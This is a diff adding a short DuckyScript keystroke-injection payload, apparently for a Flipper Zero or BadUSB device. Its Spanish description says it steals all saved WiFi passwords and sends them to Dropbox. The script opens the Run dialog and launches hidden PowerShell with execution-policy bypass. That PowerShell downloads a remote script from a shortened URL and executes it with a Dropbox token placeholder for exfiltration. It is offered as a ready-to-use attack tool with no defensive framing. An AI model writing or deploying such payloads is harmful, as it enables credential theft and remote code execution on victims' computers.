@@ -1,0 +1,9 @@
+REM Author: mrflippermen
+REM Date: 2024-07-15
+REM Description: Roba todas las contraseñas WiFi guardadas y las envía a un webhook de Dropbox.
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w h -ep bypass -C "$db='YOUR_DROPBOX_ACCESS_TOKEN';irm https://n9.cl/mrflipper1 | iex"
+ENTER
